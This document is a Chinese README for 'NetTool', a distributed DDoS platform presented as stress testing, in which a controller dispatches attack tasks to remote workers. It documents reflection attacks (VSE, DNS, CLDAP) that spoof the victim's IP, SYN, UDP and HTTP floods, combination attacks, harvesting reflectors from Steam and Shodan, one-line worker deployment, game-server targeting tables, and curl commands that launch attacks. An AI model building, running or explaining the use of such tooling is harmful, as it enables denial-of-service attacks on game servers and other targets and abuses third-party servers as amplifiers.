# NetTool - 分布式网络压力测试

## 架构

```mermaid
flowchart LR
    D["仪表盘: 浏览器 UI"] -->|"WS 统计 任务"| C["Controller: HTTP 8080 gRPC 9090"]
    C -->|"gRPC 任务下发"| W1["Worker 1"]
    C -->|"gRPC 任务下发"| W2["Worker 2"]
    C -->|"gRPC 任务下发"| WN["Worker N"]
    W1 -->|"统计流 自适应"| C
    W2 -->|"统计流 自适应"| C
    WN -->|"统计流 自适应"| C
```

- **Controller**：gRPC 服务端 + REST API + WebSocket + Web UI  
- **Worker**：gRPC 客户端，向 Controller 注册后执行攻击任务  
- **仪表盘**：基于 Alpine.js 的单页应用，WebSocket 实时推送，中英文切换  

---

## 快速开始

> **推荐使用 Linux**，功能最完整（支持 IP 欺骗、原始套接字、更高性能）。  
> Windows 支持所有攻击方式，但不支持 IP 欺骗。

### 1. 编译

```bash
# Linux（主推平台）
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/controller-linux-amd64 ./cmd/controller/
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/worker-linux-amd64    ./cmd/worker/

# Windows（功能受限：不支持 IP 欺骗，纯 Go 无需 CGO）
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/controller-windows-amd64.exe ./cmd/controller/
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/worker-windows-amd64.exe    ./cmd/worker/
```

`-ldflags="-s -w"` 去除调试符号，减小体积（controller ~17MB，worker ~12MB）。
仓库 `dist/` 目录已附带四个平台的预编译产物，可直接使用。

### 2. 启动 Controller

```bash
./controller -grpc :9090 -http :8080
```

首次运行提示输入 Steam API Key（可选，启用游戏服务器池自动刷新）：

```
Steam Web API Key not found.
Get one at: https://steamcommunity.com/dev/apikey
Enter your key (or press Enter to skip):
```

输出：
```
Admin Token:  a1b2c3d4e5f6...  ← 用于登录仪表盘
Worker Token: 7890abcdef12...  ← 分发给 Worker 节点使用
```

浏览器打开 `http://<controller-ip>:8080`，使用 **Admin Token** 登录。
`/pool` — 反射器池管理（Steam 自动导入 + 手动添加）。

### 3. 启动 Worker

```bash
# 最简启动（推荐）
./worker -c <controller-ip>:9090 -token <worker-token>

# 启用 L7 代理支持
./worker -c <controller-ip>:9090 -token <worker-token> -proxy

# 非 root 服务器：后台运行（免 nohup，日志: data/worker.log）
./worker -c <controller-ip>:9090 -token <worker-token> -daemon

# 安装为系统服务（开机自启）
sudo ./worker -c <controller-ip>:9090 -token <worker-token> -install
```

**Worker 自动检测：**
- 公网 IP 并生成节点 ID（如 `1-2-3-4-node1`）
- 通过 `api.ip.cc` 检测地理位置（如 CN, US, SG）
- 自动启用本地反射器池
- 拉取 Steam VSE 池并并发测试（200协程）

**可用参数：**
- `-c` — Controller 地址（必需）
- `-token` — Worker 认证令牌（必需）
- `-proxy` — 从 Controller 拉取 L7 代理（可选）
- `-install` — 安装为 systemd/Windows 服务（可选）
- `-daemon` — 免 nohup 后台运行（可选，适合非 root 小机器；日志 `data/worker.log`、PID `data/worker.pid`）

**默认行为：**
- 带宽：无限制，Controller 断开时自动降级节流
- 本地反射器池：默认启用
- 地理优化：DNS 反射器优先同国家
- 定期重测：每 3 小时，连续 3 次失败自动移除节点

---

## Worker 保护机制

Worker 内置多重自我保护，防止大流量攻击时控制通道被淹没：

| 机制 | 触发条件 | 行为 |
|-----------|----------|----------|
| **心跳熔断** | gRPC 心跳连续失败 | 1次→监控, 2次→带宽减半, 3次→降至1Mbps, 4+次→0.1Mbps。恢复后自动复原 |
| **上报降频** | 心跳延迟 > 1s | 上报间隔 500ms → 1s → 2s。每 3s 自动调回 |
| **全局带宽限制** | Controller 断开时自动降级 | 为重连预留带宽，同时通过本地反射器池维持攻击 |
| **gRPC Keepalive** | 始终启用 | 10s ping / 5s timeout。断开 <10s 检测 |
| **系统负载上报** | 每 3s 心跳 | CPU% + 内存 MB 发送给 Controller，仪表盘节点列表可见 |
| **自动线程调优** | 每 15s | CPU >80% → 带宽缩至 70%; CPU <40% → 带宽扩至 130%。熔断降级期间暂停 |
| **反射器缓存** | 攻击启动时 | 本地缓存反射器列表；检查 `/api/reflectors/version` 后决定是否重新拉取 |
| **本地反射器池** | 启动时自动启用 | Worker 维护本地 SQLite 数据库，存储已测试反射器。质量评分：成功率 40% + 延迟 30% + 放大倍数 20% + 稳定性 10% |
| **热池动态替换** | 攻击进行中 | 实时监控反射器失败。每 30 秒检查，将失败次数 ≥10 的节点从备用池替换 |
| **地理优化** | 自动检测位置 | DNS 反射器优先同国家。VSE 使用全球池。延迟从 200-800ms 降至 20-150ms |
| **系统负载上报** | 每次心跳(3s) | CPU% + 内存 MB 上报 Controller，仪表盘可见 |
| **自动线程调优** | 每 15s | CPU>80% → 降至70%带宽；CPU<40% → 升至130%。熔断降级期间自动暂停，避免覆盖降级带宽 |
| **反射器缓存** | 攻击启动时 | 本地缓存反射器列表；版本变化时自动更新 |

---

## 攻击方式

### 组合攻击（新增）
同时对单个目标执行多种攻击方式。所有子攻击共享同一目标和持续时间，同时启动，统计聚合。

```
目标: ark-server:27015
持续时间: 60s
子攻击:
  ├── vse_reflector    线程=200  包大小=1400
  ├── dns_reflector    线程=200  包大小=512
  └── tcp_syn_spoof    线程=500  包大小=1200
```

### VSE 放大攻击
```
目标：游戏服务器:27015
请求：25 字节（A2S_INFO 查询）
响应：200-4000 字节 → 10x-160x 放大倍数
```

### VSE 反射器放大（仅 Linux — IP 欺骗）
```
Worker → [伪造源IP=受害者] → 反射器 → [259B 响应] → 受害者
需要：Linux + root，反射器池已加载
```

### DNS 反射放大（仅 Linux — IP 欺骗）
```
Worker → [伪造源IP=受害者] → DNS 解析器 → [大响应包] → 受害者
需要：Linux + root，DNS 解析器池已加载
```

### CLDAP 反射放大（仅 Linux — IP 欺骗）
```
Worker → [伪造源IP=受害者] → CLDAP 服务器 → [39字节查询 → 1000-6000+字节响应] → 受害者
放大倍数：25x-150x
需要：Linux + root，CLDAP 服务器池已加载
```

### 四层攻击
| 方法 | 类型 | 说明 |
|--------|------|-------------|
| `udp_stdhex` | UDP | 0xDEADBEEF 头 + 随机填充 |
| `udp_plain` | UDP | 全 'A' 填充 |
| `udp_bypass` | UDP | 10 组随机载荷轮换 |
| `udp_burst` | UDP | 5 连发，间隔 100ms |
| `tcp_syn` | TCP | 半开连接洪泛 |
| `tcp_syn_spoof` | TCP | SYN 洪泛 + 随机伪造源IP（仅 Linux，原始套接字，每线程复用 fd） |
| `tcp_ack` | TCP | 连接后每条发送 50 个 ACK 载荷 |
| `tcp_connect` | TCP | 完整连接并立即关闭 |
| `tcp_tcpbypass` | TCP | TCP bypass 洪泛，载荷轮换 |
| `cldap_reflector` | UDP 放大 | CLDAP 反射放大（39字节查询，25x-150x 放大，仅 Linux） |

### 七层攻击
| 方法 | 说明 |
|--------|-------------|
| `http_flood` | 快速 HTTP GET 请求 |
| `https_bypass` | HTTPS GET（跳过 TLS 验证 + 代理轮换） |

### 游戏专项
| 游戏 | 默认端口 | 推荐攻击 |
|------|-------------|----------------|
| CS:GO / Apex | 27015 | VSE 放大 |
| Rust | 28015 | VSE 放大 |
| Minecraft | 25565 | TCP 握手 / 登录 |
| PUBG / ARK / Fortnite | 27015 | Game UDP Spam（带前缀） |

---

## Web 仪表盘

### 登录
输入 Controller 启动时打印的 **Admin Token**。

### 新建攻击
1. 选择攻击方法（或选 **组合攻击** 同时执行多种）
2. 填入目标（`IP:端口` 或 URL）
3. 组合攻击模式：添加子攻击，每个可独立配置线程/包大小/速率限制
4. 设置持续时间 / 线程数 / 包大小
5. 点击 **Start Attack**

所有已连接的 Worker 将同时接收并执行该任务。任务创建后处于 `pending` 状态，
Controller 在各 Worker 心跳时逐个派发；当所有在线 Worker 都已领取后任务翻转为 `running`。
若某个尚未领取的 Worker 在派发期间掉线，离线检测（5s）会自动重新评估并翻转，避免任务卡在 `pending`。

### 语言切换
点击页面头部 **[EN]** / **[中文]** 按钮切换中英文界面，偏好自动保存至 localStorage。

### VSE 扫描器
扫描 Source Engine（A2S_INFO）游戏服务器，支持：
- **单 IP**：起始 IP 和结束 IP 填相同值
- **范围扫描**：填入不同的起始/结束 IP

结果展示服务器名称、游戏、地图、玩家数、VAC 状态和响应大小。  
点击结果的 **Attack** 按钮可自动填充目标并切换为 VSE 方式。

### 代理管理器
在线编辑全局代理文件，格式：
```
# HTTP 代理
192.168.1.1:8080
http://user:pass@proxy.example.com:3128

# SOCKS5 代理
socks5://user:pass@socks.example.com:1080
```
点击 **Save** 持久化。Worker 使用 `--proxy controller` 参数可自动拉取。

### Worker 启动命令 / 快速上线
配置**云存储 URL**（worker 二进制直链），勾选可选参数（`-proxy` 拉取 L7 代理 /
`-install` 安装自启动服务 / `-daemon` 后台运行），仪表盘自动拼接控制器地址 + worker
令牌生成一行下载即跑的命令。`-install` 与 `-daemon` 互斥。配置持久化在
`data/deploy_storage_url.txt`。

### 反射器池管理（`/pool`）
独立的游戏反射器池管理页面。每个游戏标签页（ARK / CS2 / Rust / 其他）包含：
- **Steam 条目**：通过 Steam Web API 每 6 小时自动刷新（需 `data/steam_api.key`）
- **手动条目**：粘贴 `IP:端口` 列表（FOFA/Shodan 导出），添加时自动扫描验证
- **测试清理**：UDP 验证手动条目，自动剔除失效服务器
- 向"其他"池添加条目可自动按游戏类型分类

---

## CLI 模式

```bash
# 创建组合攻击任务
curl -X POST http://localhost:8080/api/tasks \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"target":"1.2.3.4:27015","method":"combo","duration":60,
       "sub_attacks":[
         {"method":"vse_reflector","threads":200,"packet_size":1400},
         {"method":"dns_reflector","threads":200,"packet_size":512},
         {"method":"tcp_syn_spoof","threads":500,"packet_size":1200}
       ]}'

# 创建单个攻击任务
curl -X POST http://localhost:8080/api/tasks \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"target":"1.2.3.4:27015","method":"vse","duration":60,"threads":20}'

# 创建 TCP SYN 伪造源IP 攻击（仅 Linux）
curl -X POST http://localhost:8080/api/tasks \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"target":"1.2.3.4:27015","method":"tcp_syn_spoof","duration":60,"threads":200}'

# 扫描单个 IP
curl -X POST http://localhost:8080/api/scan \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"ip":"202.189.4.160","port":27015}'

# 扫描 IP 段
curl -X POST http://localhost:8080/api/scan \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"start_ip":"192.168.1.1","end_ip":"192.168.1.254","port":27015,"concurrency":50}'

# 列出所有游戏池
curl http://localhost:8080/api/pools -H "Authorization: Bearer <admin-token>"

# 强制刷新某个游戏的 Steam 池
curl -X POST http://localhost:8080/api/pools/ark/refresh \
  -H "Authorization: Bearer <admin-token>"

# 添加手动条目（自动扫描验证）
curl -X POST http://localhost:8080/api/pools/other/add \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '["1.2.3.4:27015","5.6.7.8:27016"]'

# 检查反射器池版本（缓存用）
curl http://localhost:8080/api/reflectors/version \
  -H "Authorization: Bearer <admin-token>"
```

---

## 项目结构

```
ds/
├── cmd/
│   ├── controller/main.go    # Controller 入口
│   └── worker/main.go        # Worker 入口
├── internal/
│   ├── attack/
│   │   ├── attack.go         # 攻击引擎（VSE、L4、L7、游戏专项）
│   │   ├── combo.go          # ComboSession: 多方法同时攻击聚合
│   │   ├── tcp_syn_spoof.go  # TCP SYN 随机伪造源IP
│   │   ├── spoof_linux.go    # IP 欺骗原始套接字（UDP/TCP，仅 Linux）
│   │   ├── spoof_other.go    # IP 欺骗空实现（Windows）
│   │   ├── sendmmsg_linux.go # Linux sendmmsg 批量 UDP 发送
│   │   ├── sendmmsg_other.go # 非 Linux 平台逐包发送回退
│   │   ├── udp_raw_linux.go  # UDP 原始套接字 fd 提取
│   │   ├── socks5udp.go      # SOCKS5 UDP 中继（代理扫描）
│   │   ├── steam.go          # Steam Web API 服务器发现
│   │   ├── proxy.go          # HTTP/HTTPS/SOCKS5 代理管理
│   │   ├── hot_pool.go       # 热反射器池（攻击中动态替换）
│   │   └── ratelimiter_test.go # 速率限制器单元测试
│   ├── controller/
│   │   ├── controller.go     # gRPC + REST + WebSocket 服务
│   │   ├── shodan.go         # Shodan API DNS 发现集成
│   │   ├── spoof_probe.go    # UDP 欺骗探针监听
│   │   └── tls.go            # 可选 TLS 证书加载
│   ├── worker/
│   │   ├── worker.go         # gRPC 客户端 + 任务执行 + 自启动
│   │   ├── bandwidth.go      # Linux 网卡带宽自动检测
│   │   ├── local_pool.go     # Worker 本地 SQLite 反射器缓存
│   │   ├── location.go       # 通过 api.ip.cc 检测地理位置
│   │   ├── spoof_probe.go    # Worker 端 IP 欺骗能力探测
│   │   ├── sysinfo_linux.go  # Linux CPU/内存 使用率采集
│   │   └── sysinfo_windows.go# Windows CPU/内存 使用率采集
│   ├── reflector/
│   │   └── pool.go           # 游戏反射器池管理
│   └── proto/
│       ├── attack.proto      # Protobuf 服务定义
│       ├── attack.pb.go
│       └── attack_grpc.pb.go
├── web/
│   ├── embed.go              # Go embed 静态文件嵌入
│   └── static/
│       ├── index.html        # Alpine.js 仪表盘 SPA（中英双语）
│       └── pool.html         # 反射器池管理页面（中英双语）
├── data/                     # 运行时文件（自动创建）
│   ├── auth/
│   │   ├── admin.token
│   │   └── worker.token
│   ├── steam_api.key         # Steam Web API 密钥（可选）
│   ├── shodan_config.json    # Shodan API 配置
│   ├── reflectors.db         # SQLite 反射器池
│   ├── dns_amp_domain.txt    # 自定义 DNS 放大域名
│   ├── dns_amp_domains.txt   # DNS 放大域名列表
│   └── proxies.txt           # 全局代理列表
├── dist/                     # 预编译产物（-ldflags="-s -w"）
│   ├── controller-windows-amd64.exe
│   ├── worker-windows-amd64.exe
│   ├── controller-linux-amd64
│   ├── worker-linux-amd64
│   └── data/                 # 绑定的运行时数据
├── vse_amp_test.py           # VSE 反射器放大测试工具
├── dns_amp_test.py           # DNS 放大倍数测试工具
├── cldap_amp_test.py         # CLDAP 反射器测试工具
├── go.mod
├── go.sum
├── README.md
└── README_CN.md
```

---

## 操作系统支持

> Linux 为首选平台。所有功能可用，包括 IP 欺骗（需 root）。

| 功能 | Linux | Windows |
|---------|-------|---------|
| IP 欺骗（UDP + TCP SYN） | ✓（root） | ✗ |
| VSE 攻击 | ✓ | ✓ |
| 四层 UDP/TCP | ✓ | ✓ |
| 七层 HTTP/HTTPS | ✓ | ✓ |
| 代理（SOCKS5） | ✓ | ✓ |
| 带宽自动检测 | ✓ | ✗ |
| 系统负载上报 | ✓ | ✓ |
| 自启动 | systemd | schtasks |

---

## API 参考

| 接口 | 方法 | 认证 | 说明 |
|----------|--------|------|-------------|
| `/api/auth` | POST | 无 | 使用 Token 登录，返回角色 |
| `/api/nodes` | GET | Bearer | 列出已连接的 Worker 节点（含 CPU/内存） |
| `/api/tasks` | GET | Bearer | 列出所有任务 |
| `/api/tasks` | POST | Bearer | 创建攻击任务（支持 `sub_attacks` 组合攻击） |
| `/api/tasks/:id/stop` | POST | Bearer | 停止运行中的任务 |
| `/api/stats` | GET | Bearer | 聚合实时统计（PPS、BPS、包数） |
| `/api/scan` | POST | Bearer | VSE/DNS 服务器扫描（单 IP 或 IP 段） |
| `/api/proxy` | GET | Bearer | 获取全局代理文件内容 |
| `/api/proxy` | PUT | Bearer | 更新全局代理文件 |
| `/api/pools` | GET | Bearer | 列出游戏池及计数 |
| `/api/pools/{game}` | GET | Bearer | 列出池中条目 |
| `/api/pools/{game}/add` | POST | Bearer | 添加手动条目（自动扫描） |
| `/api/pools/{game}/refresh` | POST | Bearer | 从 Steam API 刷新 |
| `/api/pools/{game}/test` | POST | Bearer | 测试手动条目并清理失效 |
| `/api/reflectors/all` | GET | Bearer | 攻击用合并目标列表 |
| `/api/reflectors/version` | GET | Bearer | 池版本哈希+计数（Worker 缓存用） |
| `/api/templates` | GET/POST/DELETE | Bearer | 攻击模板 CRUD |
| `/api/deploy/config` | GET/PUT | Bearer | 快速上线云存储 URL 配置 |
| `/api/deploy/command` | GET | Bearer | 生成部署命令（`addr`、`proxy=1`、`install=1`、`daemon=1`） |
| `/api/logs` | GET | Bearer | 攻击日志历史 |
| `/api/logs/export` | GET | Bearer | CSV 导出 |
| `/ws` | WS | query | 仪表盘实时数据推送 |

---

<details>
<summary><b>代码流程图</b>（点击展开）</summary>

### 1. Controller 启动流程

```mermaid
flowchart TD
    A["main.go: flag.Parse()"] --> B["ensureSteamKey()"]
    B --> C["controller.New()"]
    C --> D["loadOrGenerate: admin.token"]
    C --> E["loadOrGenerate: worker.token"]
    C --> F["os.ReadFile: proxies.txt"]
    C --> G["reflector.InitAllPools()"]
    D --> H["ctrl.Start()"]
    E --> H
    F --> H
    G --> H
    H --> I["grpc.NewServer()"]
    I --> J["srv.Serve(:9090)"]
    H --> K["watchOfflineNodes: 5s 定时"]
    H --> L["cronSteamRefresh: 每 6h"]
    H --> M["cronManualTest: 每 1h"]
    H --> N["http.NewServeMux()"]
    N --> O["ListenAndServe(:8080)"]
```

### 2. Worker 生命周期

```mermaid
flowchart TD
    A["main.go: flag.Parse()"] --> B["GetWANIP()"]
    B --> C["生成节点 ID"]
    C --> D["worker.New()"]
    D --> E["worker.Connect()"]
    E --> F["worker.Run()"]
    F --> G["检测 root/admin + 自动检测带宽"]
    G --> H["fetchProxy()"]
    H --> I["register() RPC"]
    I -->|"ID 冲突"| J["Controller 分配新 ID"]
    I --> K["心跳循环: 每 3s"]
    K --> K1["collectSystemStats (CPU/内存)"]
    K1 --> L["Heartbeat RPC (含 CPU/内存)"]
    L -->|"待执行任务"| M["startTask()"]
    L -->|"取消任务"| N["stopTask()"]
    L -->|"连接错误"| O["熔断: 逐级降带宽/求生存"]
    M --> P["streamStats: 自适应 500ms-2s"]
    K --> Q["autoTuneThreads: 每 15s"]
```

### 3. 组合攻击全流程

```mermaid
sequenceDiagram
    participant UI as 仪表盘
    participant C as Controller
    participant W as Worker
    participant CS as ComboSession
    participant A1 as 子攻击1
    participant A2 as 子攻击2
    participant A3 as 子攻击3

    UI->>C: POST /api/tasks (method=combo, sub_attacks=[...])
    C->>C: 校验 + 创建 TaskInfo
    C-->>UI: task JSON + WS 推送
    W->>C: Heartbeat (每 3s)
    C-->>W: HeartbeatResp(task + sub_attacks)
    W->>W: fetchReflectorCache (5分钟TTL + 版本检查)
    W->>CS: StartComboAttack(cfg, subCfgs)
    CS->>A1: StartVSEAmplificationEx()
    CS->>A2: StartDNSAmplificationEx()
    CS->>A3: StartSpoofedTCPFloodEx()
    loop 聚合统计
        CS->>CS: trackComboRates (求和 PPS/BPS)
    end
    W->>C: ReportStats (组合聚合数据)
    C-->>UI: WS 更新
```

### 4. 攻击任务全流程

```mermaid
sequenceDiagram
    participant UI as 仪表盘
    participant C as Controller
    participant W as Worker
    participant ATK as 攻击引擎

    UI->>C: POST /api/tasks
    C->>C: 校验参数 + 检查 Worker
    C->>C: 创建 TaskInfo(pending)
    C-->>UI: task JSON + WS 推送
    W->>C: Heartbeat (每 3s)
    C->>C: 查找待分配任务(pending)
    C->>C: 派发给未领取的本 Worker
    C->>C: 全部在线 Worker 已领取? → 翻转 running
    C-->>W: HeartbeatResp(task)
    C-->>UI: WS 更新
    W->>ATK: 启动攻击
    ATK-->>W: AttackSession
    loop 自适应 500ms-2s
        W->>C: ReportStats
    end
    ATK->>ATK: 持续时间到期
    W->>C: ReportStats(finished)
    C-->>UI: WS 更新 (completed)
    Note over UI,ATK: 手动停止:
    UI->>C: POST /api/tasks/stop
    W->>C: Heartbeat
    C-->>W: HeartbeatResp(cancel)
    W->>ATK: session.Stop()
```

### 5. Worker 保护：心跳熔断

```mermaid
flowchart TD
    A["Heartbeat RPC"] --> B{失败?}
    B -->|否| C["failStreak = 0, 恢复限制"]
    B -->|是| D["failStreak 递增"]
    D --> E{failStreak?}
    E -->|1| F["监控 — 无动作"]
    E -->|2| G["带宽 → 50%"]
    E -->|3| H["带宽 → 1 Mbps (求生模式)"]
    E -->|4+| I["带宽 → 0.1 Mbps"]
    G --> J["恢复定时器: 10s"]
    H --> J
    I --> J
    J --> K{"3+次失败 & 10s已过?"}
    K -->|是| L["紧急: 停止所有攻击"]
    K -->|否| J
```

### 6. VSE 扫描器

```mermaid
flowchart TD
    A["UI: startScan()"] --> B{"单IP 或 IP段?"}
    B -->|单IP| C["POST /api/scan ip port"]
    B -->|IP段| D["POST /api/scan start end port"]
    C --> E["handleScan()"]
    D --> E
    E --> F{"ip 字段已设置?"}
    F -->|是| G["ScanIP() 3s 超时"]
    F -->|否| H["ScanRange() 信号量控制"]
    G --> I["ResolveUDPAddr"]
    H --> G
    I --> J["ListenUDP + WriteToUDP"]
    J --> K["ReadFromUDP 3s"]
    K -->|"0x49 INFO"| L["parseServerInfo()"]
    K -->|"0x41 CHALLENGE"| M["发送挑战码 + 再次读取"]
    M --> L
    L --> N["返回 ScanResult 至 UI"]
```

### 7. gRPC 协议

```mermaid
flowchart LR
    subgraph Controller
        NS["NodeService Server"]
    end
    subgraph Worker
        NC["NodeService Client"]
    end
    NC -->|"1. Register (CPU/内存信息)"| NS
    NS -->|"assigned_id"| NC
    NC -->|"2. Heartbeat 3s (CPU% + 内存)"| NS
    NS -->|"PendingTask / CancelTaskId"| NC
    NC -->|"3. ReportStats 流 自适应"| NS
    NS -->|"StatsAck"| NC
    NC -->|"4. Deregister"| NS
```

### 8. WebSocket 广播

```mermaid
sequenceDiagram
    participant UI as 仪表盘
    participant C as Controller
    participant MEM as wsClients

    UI->>C: GET /ws
    C->>C: 升级连接
    C-->>UI: nodes 数据
    loop 保活
        UI-->>C: ReadMessage
    end
    Note over C: 节点或任务变化
    C->>MEM: 遍历客户端
    MEM-->>UI: 广播 JSON
```

### 9. 离线节点检测

```mermaid
flowchart TD
    A["watchOfflineNodes: 5s 定时"] --> B["遍历所有节点"]
    B --> C{"最后心跳 > 15s?"}
    C -->|是| D["标记 OFFLINE"]
    C -->|否| E["跳过"]
    D --> R{"有节点掉线?"}
    R -->|是| S["重评估 pending 任务"]
    S --> T{"在线 Worker 已全部领取?"}
    T -->|是| U["翻转 running（自愈）"]
    T -->|否| F["WS 广播节点列表"]
    U --> F
    R -->|否| F
    E --> F
    F --> B
    G["Worker 心跳 3s"] --> H["更新时间戳"]
```

</details>
